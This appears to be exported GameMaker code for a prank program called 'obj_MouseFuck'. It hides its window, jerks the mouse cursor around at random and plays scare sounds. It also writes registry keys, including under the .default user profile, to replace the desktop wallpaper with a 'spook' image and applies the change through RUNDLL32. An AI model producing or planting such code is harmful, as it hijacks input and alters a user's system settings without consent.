// ===== object obj_MouseFuck  sprite#=-1 parent=-100 depth=0 solid=False visible=True persistent=False
  -- event Create / 0
    // action: Execute Code (applies_to=self)
    window_set_visible(false)
    sound_play(snd_WHATTHEFUCK)
    alarm[0]=800
    
  -- event Alarm / Alarm 1
    // action: Execute Code (applies_to=self)
    game_end()
    
  -- event Alarm / Alarm 0
    // action: Execute Code (applies_to=self)
    registry_set_root(0) // sets the root to HKEY_CURRENT_USER
    registry_write_string_ext('Control Panel\desktop','Wallpaper', temp_directory + "\spook.png")
    registry_write_string_ext('control panel\desktop','stretchwallpaper', '0')
    registry_write_string_ext('control panel\desktop','TileWallpaper','0')
    registry_write_string_ext('control panel\desktop','wallpaperstyle','2')
    
    sleep(20)
    
    registry_set_root(3)
    registry_write_string_ext('.default\Control Panel\desktop','Wallpaper', temp_directory + "\spook.png")
    registry_write_string_ext('.default\control panel\desktop','stretchwallpaper', '0')
    registry_write_string_ext('.default\control panel\desktop','TileWallpaper','0')
    registry_write_string_ext('.default\control panel\desktop','wallpaperstyle','2')
    
    sleep(20)
    
    execute_shell('RUNDLL32.EXE','user32.dll, UpdatePerUserSystemParameters',);
    
    sound_stop_all()
    sound_play(snd_Scream)
    alarm[1]=100
    
  -- event Step / Step
    // action: Execute Code (applies_to=self)
    display_mouse_set(random(4000),20)
    

